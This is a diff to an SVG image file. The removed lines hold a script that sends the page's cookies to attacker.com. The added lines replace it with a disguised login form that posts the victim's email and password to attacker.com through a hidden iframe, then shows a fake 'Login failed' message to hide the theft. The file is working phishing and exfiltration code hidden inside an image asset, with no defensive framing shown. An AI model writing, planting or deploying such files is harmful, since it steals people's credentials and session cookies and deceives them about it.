@@ -1,11 +1,64 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
-  <script type="text/javascript">
-    <![CDATA[
-      alert("XSS via SVG");
-      // Exfiltrate data to attacker's server
-      fetch("https://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie));
-    ]]>
-  </script>
-  <rect width="100" height="100" fill="red" onclick="alert('Click XSS')"/>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="500" viewBox="0 0 400 500">
+  
+  <!-- Modern Login Form Design -->
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml" style="font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); padding: 40px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+      <style>
+        .login-container { max-width: 320px; margin: 0 auto; }
+        .logo { text-align: center; margin-bottom: 25px; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; color: #4a5568; }
+        input { width: 100%; padding: 12px; border: 1px solid #e2e8f0; border-radius: 6px; font-size: 14px; }
+        button { width: 100%; padding: 14px; background: #4299e1; color: white; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
+        button:hover { background: #3182ce; }
+        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #718096; }
+      </style>
+
+      <div class="login-container">
+        <div class="logo">
+          <svg width="60" height="60" viewBox="0 0 24 24" style="fill: #4299e1;">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+          </svg>
+          <h2 style="color: #2d3748; margin-bottom: 5px;">Welcome Back</h2>
+          <p style="color: #718096; margin-top: 0;">Please login to continue</p>
+        </div>
+
+        <form id="loginForm" action="https://attacker.com/steal" method="POST">
+          <div class="input-group">
+            <label for="username">Email</label>
+            <input type="text" id="username" name="username" placeholder="Enter your email" required>
+          </div>
+          
+          <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="••••••••" required>
+          </div>
+          
+          <button type="submit">Sign In</button>
+        </form>
+
+        <div class="footer">
+          <p>Don't have an account? <a href="#" style="color: #4299e1; text-decoration: none;">Sign up</a></p>
+          <p><a href="#" style="color: #718096; text-decoration: none;">Forgot password?</a></p>
+        </div>
+      </div>
+    </div>
+  </foreignObject>
+
+  <!-- Hidden iframe to silently submit data -->
+  <foreignObject width="0" height="0">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <iframe name="hiddenFrame" style="display:none;"></iframe>
+      <script>
+        document.getElementById('loginForm').target = 'hiddenFrame';
+        document.getElementById('loginForm').addEventListener('submit', function() {
+          setTimeout(function() {
+            alert("Login failed. Please try again.");
+          }, 500);
+        });
+      </script>
+    </div>
+  </foreignObject>
 </svg>
+
